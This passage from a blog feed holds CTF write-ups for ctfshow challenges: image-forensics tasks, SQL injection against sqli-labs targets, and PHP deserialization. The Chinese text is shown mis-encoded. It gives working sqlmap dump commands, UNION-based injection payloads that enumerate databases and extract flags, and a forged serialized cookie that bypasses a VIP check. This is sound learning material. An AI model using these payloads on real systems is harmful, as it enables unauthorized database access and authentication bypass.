<h1 id="misc8"><a href="#misc8" class="headerlink" title="misc8"></a>misc8</h1><p>binwalk-e æ— æ³•åˆ†ç¦»</p>
<p>foremost åˆ†ç¦»æ‰“å¼€output</p>
<p>å‘ç°å›¾ç‰‡</p>
<p>ctfshow{1df0a9a3f709a2605803664b55783687}</p>
<h1 id="misc11"><a href="#misc11" class="headerlink" title="misc11"></a>misc11</h1><p>binwalk æŸ¥çœ‹å‘ç°ä¸¤ä¸ªIDATæ•°æ®å—</p>
<p><a href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a>æ˜¯PNG IDATçš„å¯é€‰å‹ç¼©æ ¼å¼</p>
<p>ç”¨tweakpng</p>
<p>æ‰“å¼€åˆ é™¤çš„ä¸€ä¸ªIDAT</p>
<p>ä¿å­˜ï¼Œæˆ–è€…æŒ‰f7å›¾ç‰‡é¢„è§ˆå‘ç°flag</p>
<p><code>ctfshow&#123;44620176948fa759d3eeafeac99f1ce9&#125;</code></p>
<h1 id="misc-18"><a href="#misc-18" class="headerlink" title="misc 18"></a>misc 18</h1><p>ä¸‹è½½é¢˜ç›®ä¸º.tif æ–‡ä»¶</p>
<p>ç”¨ <code>exiftool</code> æŸ¥çœ‹å›¾ç‰‡.</p>
<p>å‚è€ƒæ–‡çŒ®ã€‚</p>
<p><a href="https://blog.csdn.net/LYJ20010728/article/details/119193793"> ctfshow-Miscå…¥é—¨_H3rmesk1tçš„åšå®¢-CSDNåšå®¢_ctfshowmiscå…¥é—¨</a></p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-sqli-labs</title>
    <url>/2023/04/14/ctfshow-sqli-labs/</url>
    <content><![CDATA[<p>â€‹    sqli-labs</p>
<p>â€‹    <span id="more"></span></p>
<h2 id="web517"><a href="#web517" class="headerlink" title="web517"></a>web517</h2><p>å­—ç¬¦å‹é—­åˆ</p>
<p>è§£æ³•1</p>
<p>sqlmap ç›´æ¥æ¢­,ä½†æ˜¯sqlmapä¸åˆ©äºsqlæ³¨å…¥å­¦ä¹ æ‰€ä»¥ä¹‹åè¿˜æ˜¯æ‰“ç®—ç”¨æ‰‹æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c41f0413-7856-4f4d-a452-2bab3c540ba0.challenge.ctf.show/?id=1 --dbs</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://c41f0413-7856-4f4d-a452-2bab3c540ba0.challenge.ctf.show/?id=1 --tables -D &#x27;ctfshow&#x27; --dump</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;bbe97e6a-2992-4aa7-bc51-5a69cab6d0dc&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•2</p>
<p>è”åˆæ³¨å…¥ä¸€ä¸‹è¯•è¯•</p>
<p>åªæœ‰ä¸€æ¡å›æ˜¾æ‰€ä»¥</p>
<p>å…³äºgroup_concatç”¨æ³•</p>
<p><img src="/2023/04/14/ctfshow-sqli-labs/QQ%E6%88%AA%E5%9B%BE20230414171532.png"></p>
<p>çˆ†åº“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata-- -</span><br></pre></td></tr></table></figure>

<p>ctfshow,ctftraining,information_schema,mysql,performance_schema,security,test</p>
<p>æŸ¥æ•°æ®åº“ctfshowçš„è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;ctfshow&#x27;-- -</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨flagè¡¨æ ¼</p>
<p>æŸ¥å­—æ®µåå­—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27;-- -</span><br></pre></td></tr></table></figure>

<p>id,flag</p>
<p>æŸ¥å­—æ®µ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,flag from ctfshow.flag-- -</span><br></pre></td></tr></table></figure>

<p>ctfshow{372292b7-6add-43c5-8c8c-e9a12c7de8a2}</p>
<h2 id="web518"><a href="#web518" class="headerlink" title="web518"></a>web518</h2><p>æ•°å­—ç±»å‹é—­åˆ</p>
<p>-1â€™  æ¢æˆ-1 å³å¯</p>
<h2 id="web519"><a href="#web519" class="headerlink" title="web519"></a>web519</h2><p><code>&#39;)</code>é—­åˆ</p>
<h2 id="web520"><a href="#web520" class="headerlink" title="web520"></a>web520</h2><p><code>&quot;)</code>é—­åˆå•ä¸ªåŒå¼•å·</p>
<h2 id="web521"><a href="#web521" class="headerlink" title="web521"></a>web521</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://690423f6-d413-4532-947c-1a665f81c17c.challenge.ctf.show/?id=1 --batch -D &#x27;ctfshow&#x27; --tables --dump</span><br></pre></td></tr></table></figure>

<p>ctfshow{aabc5665-5832-4732-b706-88340fc65f12}</p>
<p>å­¦ä¹ ä¸€ä¸‹æ€æœ«å†™è„šæœ¬</p>
<h2 id="web522"><a href="#web522" class="headerlink" title="web522"></a>web522</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow_web_ååºåˆ—åŒ–</title>
    <url>/2023/02/02/ctfshow-web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>æŒç»­å­¦ä¹ ä¸­ã€‚ã€‚ã€‚</p>
   <span id="more"></span>

<h2 id="web254-â€“phpç±»å’Œå¯¹è±¡"><a href="#web254-â€“phpç±»å’Œå¯¹è±¡" class="headerlink" title="web254 â€“phpç±»å’Œå¯¹è±¡"></a>web254 â€“phpç±»å’Œå¯¹è±¡</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p><code>username=xxxxxx&amp;password=xxxxxx</code></p>
<p>-&gt;å¯ä»¥ç†è§£ä¸ºâ€œçš„â€</p>
<h2 id="1ã€å®šä¹‰ç±»"><a href="#1ã€å®šä¹‰ç±»" class="headerlink" title="1ã€å®šä¹‰ç±»"></a>1ã€å®šä¹‰ç±»</h2><p>åœ¨ PHP ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ class å…³é”®å­—åŠ ç±»åçš„æ–¹å¼å®šä¹‰ä¸€ä¸ªç±»ï¼Œç„¶åç”¨å¤§æ‹¬å·<code>&#123; &#125;</code>å°†åœ¨ç±»ä½“ä¸­å®šä¹‰ç±»çš„å±æ€§å’Œæ–¹æ³•åŒ…è£¹èµ·æ¥ï¼Œç±»çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<p>[ä¿®é¥°ç±»çš„å…³é”®å­—] class ç±»å{<br>   ç±»çš„å±æ€§å’Œæ–¹æ³•;<br> }</p>
<p>ç±»åå’Œå˜é‡åè¿˜æœ‰å‡½æ•°åçš„å‘½åè§„åˆ™ç›¸ä¼¼ï¼Œéƒ½éœ€è¦éµå¾ª PHP ä¸­çš„è‡ªå®šä¹‰å‘½åè§„åˆ™ï¼Œå¯ä»¥æ˜¯ä»»ä½•é PHP  ä¿ç•™å­—çš„åˆæ³•æ ‡ç­¾ã€‚ä¸€ä¸ªåˆæ³•ç±»åä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼Œåé¢è·Ÿç€è‹¥å¹²å­—æ¯ï¼Œæ•°å­—æˆ–ä¸‹åˆ’çº¿ã€‚å¦‚æœç±»åç”±å¤šä¸ªå•è¯ç»„æˆï¼Œä¹ æƒ¯ä¸Šå°†æ¯ä¸ªå•è¯çš„é¦–å­—æ¯å¤§å†™ã€‚å¦å¤–ï¼Œç±»åæœ€å¥½å…·æœ‰ä¸€å®šçš„æ„ä¹‰ï¼Œä¸è¦éšä¾¿ç”±å‡ ä¸ªå­—æ¯ç»„æˆã€‚</p>
<p> ä¿®é¥°ç±»çš„å…³é”®å­—æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå¯ä»¥çœç•¥ã€‚æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ä¸‹é¢è¿™äº›å…³é”®å­—æ¥ä¿®é¥°ç±»ï¼š</p>
<ul>
<li>abstractï¼šæŠ½è±¡ç±»æˆ–æ–¹æ³•ï¼Œè¢«ä¿®é¥°ä¸ºæŠ½è±¡ç±»ä¹‹åï¼Œç±»å°†ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼Œä½†å¯ä»¥è¢«ç»§æ‰¿ã€‚å¦‚æœç±»ä¸­æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•è¢«å£°æ˜ä¸ºæŠ½è±¡çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»ä¹Ÿå¿…é¡»å£°æ˜ä¸ºæŠ½è±¡çš„ã€‚ç»§æ‰¿ä¸€ä¸ªæŠ½è±¡ç±»çš„æ—¶å€™ï¼Œå­ç±»å¿…é¡»é‡æ–°å®šä¹‰çˆ¶ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œè€Œä¸”è¿™äº›æ–¹æ³•çš„è®¿é—®æ§åˆ¶å¿…é¡»å’Œçˆ¶ç±»ä¸­ä¸€æ ·ã€‚</li>
<li>finalï¼šä½¿ç”¨ final ä¿®é¥°çš„ç±»ä¸èƒ½è¢«ç»§æ‰¿ï¼Œè€Œä½¿ç”¨ final ä¿®é¥°çš„æ–¹æ³•ä¸èƒ½åœ¨å­ç±»ä¸­é‡æ–°å®šä¹‰ã€‚</li>
</ul>
<p>æ³¨æ„ï¼šä¸€ä¸ªç±»å¯ä»¥åŒ…å«æœ‰å±äºè‡ªå·±çš„å¸¸é‡ã€å˜é‡ï¼ˆåœ¨ç±»ä¸­ç§°ä¸ºâ€œæˆå‘˜å±æ€§â€æˆ–è€…â€œå±æ€§â€ï¼‰ä»¥åŠå‡½æ•°ï¼ˆåœ¨ç±»ä¸­ç§°ä¸ºâ€œæˆå‘˜æ–¹æ³•â€æˆ–è€…â€œæ–¹æ³•â€ï¼‰ã€‚</p>
<h2 id="2ã€æˆå‘˜å±æ€§"><a href="#2ã€æˆå‘˜å±æ€§" class="headerlink" title="2ã€æˆå‘˜å±æ€§"></a>2ã€æˆå‘˜å±æ€§</h2><p>åœ¨ç±»ä¸­ç›´æ¥å£°æ˜çš„å˜é‡ç§°ä¸ºæˆå‘˜å±æ€§ï¼ˆä¹Ÿå¯ä»¥ç§°ä¸ºæˆå‘˜å˜é‡ï¼‰ï¼Œå¯ä»¥åœ¨ç±»ä¸­å£°æ˜å¤šä¸ªå˜é‡ï¼Œå³å¯¹è±¡ä¸­å¯ä»¥æœ‰å¤šä¸ªæˆå‘˜å±æ€§ï¼Œæ¯ä¸ªå˜é‡éƒ½å­˜å‚¨å¯¹è±¡ä¸åŒçš„å±æ€§ä¿¡æ¯ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<p>è®¿é—®æƒé™ä¿®é¥°ç¬¦ å±æ€§åç§° &#x3D; å±æ€§å€¼;</p>
<p>æˆå‘˜å±æ€§çš„ç±»å‹å¯ä»¥æ˜¯ PHP ä¸­çš„æ ‡é‡ç±»å‹å’Œå¤åˆç±»å‹ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œä½†åœ¨ç±»ä¸­ä½¿ç”¨èµ„æºå’Œç©ºç±»å‹æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚</p>
<p> å‰é¢æˆ‘ä»¬ç»è¿‡ï¼Œå£°æ˜å˜é‡æ—¶ä¸éœ€è¦ä»»ä½•å…³é”®å­—ä¿®é¥°ï¼Œä½†æ˜¯åœ¨ç±»ä¸­å£°æ˜æˆå‘˜å±æ€§æ—¶ï¼Œå˜é‡å‰é¢ä¸€å®šè¦ä½¿ç”¨ä¸€ä¸ªå…³é”®å­—æ¥ä¿®é¥°ï¼Œä¾‹å¦‚  publicã€privateï¼Œstatic  ç­‰ï¼Œä½†è¿™äº›å…³é”®å­—ä¿®é¥°çš„å˜é‡éƒ½å…·æœ‰ä¸€å®šçš„æ„ä¹‰ã€‚å¦‚æœä¸éœ€è¦æœ‰ç‰¹å®šæ„ä¹‰çš„ä¿®é¥°ï¼Œå¯ä»¥ä½¿ç”¨â€œvarâ€å…³é”®å­—ï¼Œä¸€æ—¦æˆå‘˜å±æ€§æœ‰å…¶ä»–çš„å…³é”®å­—ä¿®é¥°å°±éœ€è¦å»æ‰â€œvarâ€ã€‚</p>
<p> å¸¸ç”¨è®¿é—®æƒé™ä¿®é¥°ç¬¦åŠå…¶å«ä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<ul>
<li>publicï¼šå…¬å…±çš„ï¼Œåœ¨ç±»çš„å†…éƒ¨ã€å­ç±»ä¸­æˆ–è€…ç±»çš„å¤–éƒ¨éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä¸å—é™åˆ¶ï¼›</li>
<li>protectedï¼šå—ä¿æŠ¤çš„ï¼Œåœ¨ç±»çš„å†…éƒ¨å’Œå­ç±»ä¸­å¯ä»¥ä½¿ç”¨ï¼Œä½†ä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨ä½¿ç”¨ï¼›</li>
<li>privateï¼šç§æœ‰çš„ï¼Œåªèƒ½åœ¨ç±»çš„å†…éƒ¨ä½¿ç”¨ï¼Œåœ¨ç±»çš„å¤–éƒ¨æˆ–å­ç±»ä¸­éƒ½æ— æ³•ä½¿ç”¨ã€‚</li>
</ul>
<p>æ³¨æ„ï¼šä¸€ä¸ªç±»ï¼Œå³ä¸€å¯¹å¤§æ‹¬å·ä¹‹é—´çš„å…¨éƒ¨å†…å®¹éƒ½è¦åœ¨ä¸€æ®µä»£ç ä¸­ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ª<code>&lt;?php ... ?&gt;</code>ä¹‹é—´ï¼Œä¸èƒ½åˆ†å‰²æˆå¤šå—ã€‚</p>
<p>ã€ç¤ºä¾‹ã€‘åˆ›å»ºä¸€ä¸ª Students ç±»å¹¶åœ¨ç±»ä¸­å£°æ˜ä¸€äº›æˆå‘˜å±æ€§ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Students&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        public $age;</span><br><span class="line">        private $sex;</span><br><span class="line">        public static $school;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æç¤ºï¼šæƒé™ä¿®é¥°ç¬¦å¯ä»¥å’Œå®šä¹‰é™æ€å˜é‡çš„å…³é”®å­— static æ··åˆåœ¨ä¸€èµ·ä½¿ç”¨ï¼Œå¦‚ä¸Šé¢ä»£ç ä¸­æ‰€ç¤ºã€‚</p>
<h2 id="3ã€æˆå‘˜æ–¹æ³•"><a href="#3ã€æˆå‘˜æ–¹æ³•" class="headerlink" title="3ã€æˆå‘˜æ–¹æ³•"></a>3ã€æˆå‘˜æ–¹æ³•</h2><p>åœ¨ç±»ä¸­å®šä¹‰çš„å‡½æ•°è¢«ç§°ä¸ºæˆå‘˜æ–¹æ³•ã€‚å‡½æ•°å’Œæˆå‘˜æ–¹æ³•å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ï¼Œå‡½æ•°å®ç°çš„æ˜¯æŸä¸ªç‹¬ç«‹çš„åŠŸèƒ½ï¼Œè€Œæˆå‘˜æ–¹æ³•æ˜¯å®ç°ç±»ä¸­çš„ä¸€ä¸ªè¡Œä¸ºï¼Œæ˜¯ç±»çš„ä¸€éƒ¨åˆ†ã€‚</p>
<p> å¯ä»¥åœ¨ç±»ä¸­å£°æ˜å¤šä¸ªæˆå‘˜æ–¹æ³•ï¼Œæˆå‘˜æ–¹æ³•çš„å£°æ˜å’Œå‡½æ•°çš„å£°æ˜å®Œå…¨ä¸€æ ·ï¼Œåªä¸è¿‡åœ¨å£°æ˜æˆå‘˜æ–¹æ³•æ—¶å¯ä»¥åœ¨<code>function</code>å…³é”®å­—çš„å‰é¢åŠ ä¸€äº›è®¿é—®æƒé™ä¿®é¥°ç¬¦æ¥æ§åˆ¶è®¿é—®æƒé™ï¼Œä¾‹å¦‚ publicã€privateã€protected ç­‰ã€‚</p>
<p> å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå£°æ˜çš„æˆå‘˜æ–¹æ³•å¿…é¡»å’Œç±»æ˜¯ç›¸å…³çš„ï¼Œä¸èƒ½æ˜¯ä¸€äº›æ²¡æœ‰æ„ä¹‰çš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œåœ¨å£°æ˜å­¦ç”Ÿç±»æ—¶ï¼Œå¦‚æœå£°æ˜äº†â€œé£è¡Œâ€çš„æˆå‘˜æ–¹æ³•ï¼Œå®ä¾‹åŒ–å‡ºæ¥çš„æ¯ä¸ªå­¦ç”Ÿéƒ½å¯ä»¥é£äº†ï¼Œè¿™æ ·å°±æ˜¯ä¸€ä¸ªè®¾è®¡ä¸Šçš„é”™è¯¯ã€‚</p>
<p>ã€ç¤ºä¾‹ã€‘åœ¨ä¸Šé¢ç¤ºä¾‹ä¸­åˆ›å»ºçš„ Students ç±»ä¸­åˆ›å»ºä¸€äº›æˆå‘˜æ–¹æ³•ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    class Students&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        public $age;</span><br><span class="line">        private $sex;</span><br><span class="line">        public static $school;</span><br><span class="line">        public function Write()&#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        protected static function Read()&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        function Listen()&#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://c.biancheng.net/view/7492.html">http://c.biancheng.net/view/7492.html</a></p>
<h2 id="web255-â€“è®¤è¯†ååºåˆ—åŒ–"><a href="#web255-â€“è®¤è¯†ååºåˆ—åŒ–" class="headerlink" title="web255 â€“è®¤è¯†ååºåˆ—åŒ–"></a>web255 â€“è®¤è¯†ååºåˆ—åŒ–</h2><p>PHP serialize() å‡½æ•°</p>
<p><strong>serialize()</strong> å‡½æ•°ç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p><strong>serialize()</strong> å‡½æ•°åºåˆ—åŒ–å¯¹è±¡åï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†å®ƒä¼ é€’ç»™å…¶ä»–éœ€è¦å®ƒçš„åœ°æ–¹ï¼Œä¸”å…¶ç±»å‹å’Œç»“æ„ä¸ä¼šæ”¹å˜ã€‚</p>
<p>å¦‚æœæƒ³è¦å°†å·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²å˜å› PHP çš„å€¼ï¼Œå¯ä½¿ç”¨ <a href="https://www.runoob.com/php/php-unserialize-function.html">unserialize()</a>ã€‚</p>
<p><strong>è™½ç„¶æˆ‘ä»¬ä¸èƒ½æ”¹å˜ç±»æ–¹æ³•ï¼Œä½†æˆ‘ä»¬å¯ä»¥æ”¹å˜ç±»çš„å±æ€§</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¼€å§‹æœ‰ååºåˆ—åŒ–ï¼Œä¸»è¦å°±æ˜¯$isVipçš„å€¼éœ€è¦ä¸ºtrue</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªctfShowUserçš„å®ä¾‹ï¼Œå°†å…¶ä¸­çš„$isVipæ›´æ”¹ä¸ºtrue</p>
<p>é€šè¿‡cookieä¼ é€’åºåˆ—åŒ–å­—ç¬¦ä¸²å°±å¯ä»¥äº†,<strong>è®°å¾—åºåˆ—åŒ–å­—ç¬¦ä¸²è¦è¿›è¡Œurlç¼–ç </strong></p>
<p>ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">	<span class="comment">// ä¼ å…¥çš„å¯¹è±¡isvip=true;</span></span><br><span class="line">	<span class="comment">// O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">COOKIE user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span 